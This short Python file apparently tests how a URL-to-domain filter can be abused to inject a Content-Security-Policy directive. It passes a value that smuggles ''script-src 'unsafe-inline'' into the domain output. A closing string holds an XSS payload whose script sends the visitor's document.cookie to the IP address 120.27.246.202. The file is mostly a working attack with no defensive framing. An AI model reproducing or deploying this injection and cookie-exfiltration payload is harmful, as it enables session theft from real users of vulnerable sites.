import urllib.parse
def filter_url(urls):
    domain_list = []
    for url in urls:
        domain = urllib.parse.urlparse(url).scheme + "://" + urllib.parse.urlparse(url).netloc
        if domain:
            domain_list.append(domain)
    return " ".join(domain_list)



print(filter_url(["""http://120.27.246.202;script-src 'unsafe-inline'"""]))
"""
<img src="http://120.27.246.202;script-src 'unsafe-inline'"><script>new Image().src='http://120.27.246.202/?s='+document.cookie</script>
"""